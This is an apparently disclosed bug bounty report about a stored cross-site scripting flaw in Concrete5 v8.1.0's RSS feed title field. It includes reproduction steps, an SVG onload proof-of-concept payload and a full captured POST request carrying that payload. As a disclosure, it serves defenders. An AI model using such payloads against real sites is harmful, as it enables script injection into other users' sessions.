# Stored XSS in RSS Feeds Title (Concrete5 v8.1.0)

## Report Details
- **Report ID**: 221380
- **URL**: https://hackerone.com/reports/221380
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-04-16T12:30:09.557Z
- **Disclosed**: 2017-05-17T18:16:14.763Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
**Summary / Description:**
The RSS Feeds Title (`pfTitle=`) parameter does not correctly sanitize user input. This allows HTML & Javascript to be stored and executed any time someone visits `/index.php/dashboard/pages/feeds` 

## Steps to Reproduce
1. Open up Firefox
2. Login (/index.php/login)
3. Visit (index.php/dashboard/pages/feeds/add) to add a new RSS Feed
4. Put `"><svg/onload=confirm(document.domain)>` as the title 
5. Put whatever you want in the other fields and click add!

**POST REQUEST**
```
POST /index.php/dashboard/pages/feeds/add_feed HTTP/1.1
Host: ec2-34-200-232-193.compute-1.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://ec2-34-200-232-193.compute-1.amazonaws.com/index.php/dashboard/pages/feeds/add
Cookie: CONCRETE5=qgl7qbdhh6le0jph3f07uo6eu0; CONCRETE5_LOGIN=1; dashboardPanelStatus=closed
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 351

ccm_token=1492345382%3A9f0e473b3d4455fe197861e0fa77d671&pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&pfHandle=cdl&pfDescription=cdl&iconFID=0&cParentID=0&ptID=0&customTopicAttributeKeyHandle=&customTopicTreeNodeID=0&pfIncludeAllDescendents=0&pfDisplayAliases=0&pfDisplayFeaturedOnly=0&pfContentToDisplay=S&pfAreaHandleToDisplay=Main
```
6. `<svg/onload=confirm(document.domain)>` will be executed in your browser!

Anytime someone visits the RSS Feeds page (index.php/dashboard/pages/feeds), the payload will fire!

## Product, Version, and Configuration (If applicable)
Concrete5 v8.1.0

## Suggested Mitigation/Remediation Actions
Sanitize the `pfTitle=` parameter :)

## Attachments
- concrete5-rss-feed.png
- concrete5-rss-feedsxss.png
